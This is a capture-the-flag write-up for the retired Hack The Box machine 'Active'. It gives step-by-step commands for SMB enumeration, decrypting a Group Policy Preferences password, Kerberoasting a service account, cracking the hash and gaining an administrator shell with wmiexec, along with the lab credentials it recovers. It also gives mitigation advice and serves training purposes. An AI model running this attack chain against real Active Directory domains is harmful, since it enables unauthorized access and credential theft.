# HTB Active Overview
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/25cad8ed-48db-477f-950b-729d83dd9716)

[Active](https://app.hackthebox.com/machines/Active) is an easy-rated retired Machine. It features concepts of SMB, LDAP, Password Decryption, Kerberos Ticketing System, Authenticated Enumeration, and Privilege Escalation.

_Note: Write-ups are only allowed for Retired machines._

Target Machine ip: `10.10.10.100`

## Enumeration
### Network Scan
Let's scan to see which ports are open.

**Quick Scan** <br>
`nmap -sC -sV -Pn --min-rate 1000 10.10.10.100` <br>
`**-sC** Performs a script scan using the default set of scripts  <br>
**-sV** version detection  <br>
**-Pn** quiet port scan  <br>
**--min-rate 1000** request that Nmap send at least 1,000 packets per second
 
**Full Scan** <br>
 `sudo nmap -sC -sV -p- 10.10.10.100 -oN nmap.out`  <br>
**-sC** Performs a script scan using the default set of scripts <br>
**-sV** version detection <br>
**-p-** scans all ports <br>
**-oN nmap.out** outputs scan results into a file named nmap.out in the current working directory

![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/19b77058-f3b2-4ac8-8c4d-b14f7496f715)

**Interesting open ports:** <br>
`53 DNS` : Target is using Windows Server 2008 R2 SP1  <br>
`88 kerberos` : Ensuring we stay within a 1-minute window of the listed server time if we need to do an authenticated login.  <br>
`389 LDAP` : Windows AD, and we can add the domain name `active.htb` and target ip `10.10.10.100` to our `/etc/host` file.  <br>
`445 SMB` : We can check available SMB shares and confirm any low-hanging fruits like unauthenticated logins.


### DNS 
Add the `<target ip>` and the `<hostname>` into our `/etc/hosts` file, so we can use the domain name in later steps.

`echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts`

### SMB - TCP 139/445 
We'll use `smbclient` to list out any available file shares.

`smbclient -L //10.10.10.100` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/6775ee3f-6407-4902-8e50-21d6e53ffc33)

But which one do we know which share to try? Well, `smbmap` is a more robust tool that can help us with this. <br>
I found very useful feature distinctions about the various SMB tools in this article by [Raj Chandel](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

`smbmap -H 10.10.10.100` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/4a774646-4b00-4fc7-adb5-bdfd4137b6c6)

`smbmap` showed that the only share possible we can access with Anonymous credentials is the “Replication” share, which also appears to be a copy of the `SYSVOL` share.

As `Group Policies` (and Group Policy Preferences) are stored in the `SYSVOL` share, authenticated users can freely read the information. I researched more on "GPP exploitation" and found a great resource from [VK9 Security](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/).


## Foothold

As per the article, we'll be looking for the `Groups.xml` file. 

Note: Group Policy Preferences (GPP) was introduced in Windows Server 2008 which allowed admins to modify users and groups across their network. The defined password was `AES-256` encrypted and stored in `Groups.xml`. However, this was remediated with the later releases of Windows Server 2012. [Knowledge Base Article 2962486](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30)

`smbclient //10.10.10.100/Replication` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/459db31d-afc8-40ce-8740-5651391ebc02)

We confirm that we're in the correct share by using the `list` command <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/7378d917-3516-412b-bafa-faeb9e730040)

After connecting to the `Replication` share, let's download the contents recursively. We see the wanted `Groups.xml` file that typically contains username/password credentials for later exploitation.

`RECURSE ON` <br>
`PROMPT OFF` <br>
`mget *`  <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/078f40e6-236f-4823-8796-8eca764689dc)

When we open the `Groups.xml` file, we find the username as well as an encrypted password. 

Domain user: `active.htb\SVC_TGS` <br>
Encrypted password: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/d686f36a-d8e8-4b8e-b499-42a1970cc206)

Next, we will decrpyt this password using `dpp-decrypt`, a tool which comes natively with Kali Linux. 

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/38527d57-89d9-454a-a958-bd36c8dfb427)

Password: `GPPstillStandingStrong2k18`

The domain account `SVC_TGS` has the password `GPPstillStandingStrong2k18`

## Group Policy Preference Exploitation Mitigation:
+ Install [KB2962486](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30) on every computer used to manage GPOs which prevents new credentials from being placed in `Group Policy Preferences`. <br>
* Delete existing GPP xml files in `SYSVOL` containing passwords.

## Authenticated Enumeration
We can now further enumerate the system since that we have valid credentials for the `active.htb` domain. <br>

`smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18` <br>
**-H** for Host <br>
**-u** for username <br>
**-p** for password <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/aaa4c512-65c0-40e6-aed5-377c14a82195) <br>
We confirmed that the `SYSVOL` and `Users` shares are now accessible.

We connect to the `Users` share, and navigate to the user: `SVC_TGS`'s Desktop, where the user flag can be found.

Connect with a username and password: <br>
`smbclient //server/share --user username%password` <br>
`smbclient //10.10.10.100/Users --user SVC_TGS%GPPstillStandingStrong2k18` 

When we access the `Users` share, we are logged in at the `C:\users\` folder
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/32fc9aa9-c02f-49d2-ae1e-951cd798dc4a)

`cd SVC_TGS\Desktop\` <br>
`ls` <br>
`get user.txt` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/29ebaddf-2e2e-4b1d-9c7a-e9c6f88f01e9)

Back on our hostmachine tab: <br>
`cat user.txt` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/9240e06b-1fc0-4cf5-b11e-3b317526caa9)

User flag captured! <br>
`ba07*********5e32`

# Privilege Escalation
Impacket’s `GetADUsers.py` simplifies the process of enumerating domain user accounts. <br>
_Impacket is another native tool found in Kali Linux._

`GetADUsers.py -all <domain name>/<username> -dc-ip <target_ip>`

`GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100` <br>
Password: `GPPstillStandingStrong2k18` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/341878dc-a824-4dbd-ad26-bd03f5494ee0)

We use Impacket's `GetUserSPNs` to get a list of service usernames (linked to regular user accounts) and discover a kerberos ticket that we'll try to crack. 

`GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request` <br>
password: `GPPstillStandingStrong2k18` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/abc4fbdb-6c7a-4d61-8527-ceee74878052)

Success!

This gives us the kerberos ticket hash. We'll create a new text file, and copy + paste the kerberos ticket hash named 'hash.txt'

## Cracking the kerberos ticket hash
We can use either `hashcat` or `john` (the Ripper), along with `rockyou.txt` to crack the hash. <br>

### Hashcat
This kerberos ticket's hash matches with the pattern from id: `13100`	<br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/d031e608-e116-48ac-9340-f7844af1a935)

`hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`

or

### John the Ripper

`john hash.txt -w=/usr/share/wordlists/rockyou.txt` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/d08695ca-7c9c-47c7-84a0-b91fbf61ae08) <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/8030ef69-a8e6-4413-a480-7474c0a1f709)

Through either methods, we found the username: `active\administrator` and password: `Ticketmaster1968`

Now, let's continue using another one impacket's versitile tools to establish a shell to the Window's system: `wmiexec.py`

`wmiexec.py <domain>/<username>:<password>@<target ip address>` <br>
`wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/af9c58c0-4ada-400d-b1f1-8672f81afe68)

Perfect!
Now that we have Administrator access, the root flag can be found at `C:\Users\Administrator\Desktop\root.txt`

`cd C:\Users\Administrator\Desktop\` <br>
`dir` <br>
`type root.txt` <br>
![image](https://github.com/snguyenpentest/HTB-writeups/assets/147453895/264a1c54-acb9-4025-a170-c49e8edb7ca3)

Root Flag captured! <br>
`db8c**********34a2`
